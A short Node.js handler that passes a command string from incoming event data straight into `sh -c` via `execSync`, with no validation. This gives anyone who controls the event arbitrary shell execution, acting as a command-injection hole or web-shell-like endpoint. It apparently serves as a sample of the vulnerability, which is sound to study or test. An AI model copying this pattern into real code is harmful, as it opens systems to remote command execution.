import { execSync } from 'node:child_process';
export default async function handler(event) {
  execSync(`sh -c "${event.context.command}"`);
}
